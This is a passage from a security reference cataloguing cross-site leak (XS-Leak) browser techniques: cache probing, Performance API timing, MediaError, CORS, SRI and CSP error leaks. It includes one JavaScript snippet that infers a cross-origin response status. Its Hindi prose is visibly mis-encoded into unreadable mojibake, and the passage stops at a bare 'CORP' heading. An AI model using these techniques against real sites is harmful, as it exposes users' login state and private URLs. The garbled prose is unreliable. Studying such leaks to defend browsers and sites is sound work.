рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╕рдВрд╕рд╛рдзрди **рд╕реЗрд╡рд╛ рдХрд╛рд░реНрдпрдХрд░реНрддрд╛** рдХреИрд╢ рд╕реЗ **рд▓реЛрдб** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, **Performance API** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдпрд╣ рдПрдХ рдЯрд╛рдЗрдорд┐рдВрдЧ рд╣рдорд▓реЗ рдХреЗ рд╕рд╛рде рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдкреЗрдкрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ)ред

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреИрд╢ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдерд╛ред
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performance API](xs-search.md#performance-api) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреИрд╢ рдореЗрдВ рд╣реИред

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ `performance` API рд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреА рдиреЗрдЯрд╡рд░реНрдХ рдЕрд╡рдзрд┐ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗред
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** рдлрд╝рд╛рдпрд░рдлрд╝реЙрдХреНрд╕ рдореЗрдВ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЛ рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рд▓реАрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рд╕рдВрджреЗрд╢ рдкреНрд░реЙрдкрд░реНрдЯреА рдЙрди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рд╕рдВрджреЗрд╢ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд╣ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред

### CORS Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╢реНрд╡рд╛рд╕рди (SA) рдореЗрдВ, CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдкреВрд░рд╛ URL рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рд╛рдЗрдЯ рдХреЗ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХрд╛ рдЧрдВрддрд╡реНрдп рдирд┐рдХрд╛рд▓рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдпрд╣ рджрд░реНрд╢рд╛рддреА рд╣реИ рдХрд┐ Webkit-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ CORS рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдХреИрд╕реЗ рд╕рдВрднрд╛рд▓рддреЗ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЬрдм рдПрдХ **CORS-рд╕рдХреНрд╖рдо рдЕрдиреБрд░реЛрдз** рдХреЛ рдПрдХ рд▓рдХреНрд╖рд┐рдд рд╕рд╛рдЗрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддреА рд╣реИ рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдмрд╛рдж рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рд▓рдХреНрд╖реНрдп рдХрд╛ рдкреВрд░рд╛ URL** рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рднреАрддрд░ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рднреЗрджреНрдпрддрд╛ рди рдХреЗрд╡рд▓ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рддрдереНрдп рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИ рдмрд▓реНрдХрд┐ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рдЕрдВрдд рдмрд┐рдВрджреБ рдФрд░ рдХрд┐рд╕реА рднреА **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд╡реЗрд░реА рдкреИрд░рд╛рдореАрдЯрд░** рдХреЛ рднреА рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИ рдЬреЛ рдЗрд╕рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

### SRI Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╢реНрд╡рд╛рд╕рди (SA) рдореЗрдВ, CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдкреВрд░рд╛ URL рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рд╡рд┐рд╕реНрддреГрдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢реЛрдВ** рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдЖрдХрд╛рд░ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ Subresource Integrity (SRI) рдХреЗ рддрдВрддреНрд░ рдХреЗ рдХрд╛рд░рдг рд╕рдВрднрд╡ рд╣реИ, рдЬреЛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЦрдВрдбрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕рдВрд╕рд╛рдзрди, рдЬреЛ рдЕрдХреНрд╕рд░ CDNs рд╕реЗ рд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдореЗрдВ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИред SRI рдХреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрдиреНрд╣реЗрдВ **CORS-рд╕рдХреНрд╖рдо** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП; рдЕрдиреНрдпрдерд╛, рдпреЗ рдЕрдЦрдВрдбрддрд╛ рдЬрд╛рдВрдЪ рдХреЗ рдЕрдзреАрди рдирд╣реАрдВ рд╣реЛрддреЗред рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╢реНрд╡рд╛рд╕рди (SA) рдореЗрдВ, CORS рддреНрд░реБрдЯрд┐ XS-Leak рдХреА рддрд░рд╣, рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рдПрдХ рдЕрдЦрдВрдбрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝реЗрдЪ рдЕрдиреБрд░реЛрдз рдХреЗ рдмрд╛рдж рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЬрд╛рдирдмреВрдЭрдХрд░ **рдЗрд╕ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдХрд┐рд╕реА рднреА рдЕрдиреБрд░реЛрдз рдХреА рдЕрдЦрдВрдбрддрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рдореЗрдВ **рдмреЛрдЧрд╕ рд╣реИрд╢ рдорд╛рди** рдЕрд╕рд╛рдЗрди рдХрд░рдХреЗред SA рдореЗрдВ, рдкрд░рд┐рдгрд╛рдореА рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рдХреА рд╕рд╛рдордЧреНрд░реА рд▓рдВрдмрд╛рдИ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдХрд╛рд░ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдУрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдкрд░рд┐рд╖реНрдХреГрдд XS-Leak рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рд░рд╛рд╕реНрддрд╛ рдкреНрд░рд╢рд╕реНрдд рдХрд░рддреА рд╣реИред

### CSP Violation/Detection

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Summary:** рдпрджрд┐ рд╣рдо рдкреАрдбрд╝рд┐рдд рдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ CSP рдореЗрдВ рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдПрдХ рдЕрд▓рдЧ рдбреЛрдореЗрди рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, рддреЛ CSP рдПрдХ рдкрд╣рдЪрд╛рдирдиреЗ рдпреЛрдЧреНрдп рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

рдПрдХ XS-Leak CSP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рд╛рдЗрдЯ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдореВрд▓ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рд▓реАрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рд▓рдХреНрд╖реНрдп рдХрд╛ рдбреЛрдореЗрди рднреА рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рд╣реИ **рд╣рдорд▓рд╛рд╡рд░ рд╕рд╛рдЗрдЯ рдкрд░ рд▓рдХреНрд╖рд┐рдд рдбреЛрдореЗрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛**ред рдПрдХ рдмрд╛рд░ рдЬрдм рд▓рдХреНрд╖рд┐рдд рдбреЛрдореЗрди рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рд╣реЛрддрд╛ рд╣реИ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдбреЛрдореЗрди рдкрд░ред **CSP** рдЗрд╕рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ **рдЙрд▓реНрд▓рдВрдШрди рд░рд┐рдкреЛрд░реНрдЯ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ**ред рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдпрд╣ рд░рд┐рдкреЛрд░реНрдЯ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЗ рд▓рдХреНрд╖реНрдп рд╕реНрдерд╛рди рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддреА рд╣реИ**ред\
рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдпрд╣ рдирд╣реАрдВ рдмрддрд╛рдПрдВрдЧреЗ рдХрд┐ рдЗрд╕реЗ рдХрд┐рд╕ URL рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЖрдк рдЕрднреА рднреА рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### Cache

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Summary:** рдХреИрд╢ рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░реЗрдВред рд▓рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдЦреЛрд▓рддрд╛ рд╣реИ, рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреИрд╢ рдореЗрдВ рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВред
* **Code Example:**

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдЭрд╛ рдХреИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрдирдХреЗ рдореВрд▓ рдХреА рдкрд░рд╡рд╛рд╣ рдХрд┐рдП рдмрд┐рдирд╛, рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд▓рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдиреЗ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓** рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рд╣реИред

рдпрджрд┐ рдПрдХ рдкреГрд╖реНрда рдХреЗрд╡рд▓ рддрднреА рдПрдХ рдЫрд╡рд┐ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдк **рд╕рдВрд╕рд╛рдзрди рдХреЛ рдЕрдорд╛рдиреНрдп** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рддрд╛рдХрд┐ рдпрд╣ рдЕрдм рдХреИрд╢ рдореЗрдВ рди рд╣реЛ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд▓рд┐рдВрдХ рджреЗрдЦреЗрдВ), **рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ** рдЬреЛ рдЙрд╕ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдЦрд░рд╛рдм рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ** (рдЬреИрд╕реЗ, рдПрдХ рд▓рдВрдмреЗ рд╕рдВрджрд░реНрдн рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред рдпрджрд┐ рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб **рдХрд┐рд╕реА рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ **рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛** рдерд╛ред

### CSP Directive

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Summary:** CSP рд╣реЗрдбрд░ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ CSP iframe рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдиреАрддрд┐ рд╡рд┐рд╡рд░рдг рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome (GC) рдореЗрдВ рдПрдХ рдирдпрд╛ рдлреАрдЪрд░ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ **рдПрдХ рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ (CSP)** рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ iframe рддрддреНрд╡ рдкрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕реЗрдЯ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдиреАрддрд┐ рдирд┐рд░реНрджреЗрд╢ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдпрддрдГ, рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдЗрд╕рдХрд╛ рдЕрдзрд┐рдХреГрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП HTTP рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ**, рдпрд╛ рдПрдХ **рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ iframe рдкрд╣рд▓реЗ рд╕реЗ рд╣реА CSP рджреНрд╡рд╛рд░рд╛ рд╢рд╛рд╕рд┐рдд рд╣реИ рдФрд░ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдиреАрддрд┐ рдЕрдзрд┐рдХ рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдирд╣реАрдВ рд╣реИ, рддреЛ рдкреГрд╖реНрда рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд▓реЛрдб рд╣реЛрдЧрд╛ред рдпрд╣ рддрдВрддреНрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрда рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ CSP рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рд░реНрдЧ рдЦреЛрд▓рддрд╛ рд╣реИ, рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЛ рдареАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд╣рдорд╛рд░реЗ рдирд┐рд╖реНрдХрд░реНрд╖ рдПрдХ **рдирдП рд▓реАрдХ рддрдХрдиреАрдХ** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддреЗ рд╣реИрдВ рдЬреЛ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ, рдпрд╣ рд╕реБрдЭрд╛рд╡ рджреЗрддреЗ рд╣реБрдП рдХрд┐ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╕рдорд╕реНрдпрд╛ рдХреЛ рдХрднреА рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдВрдмреЛрдзрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### **CORP**

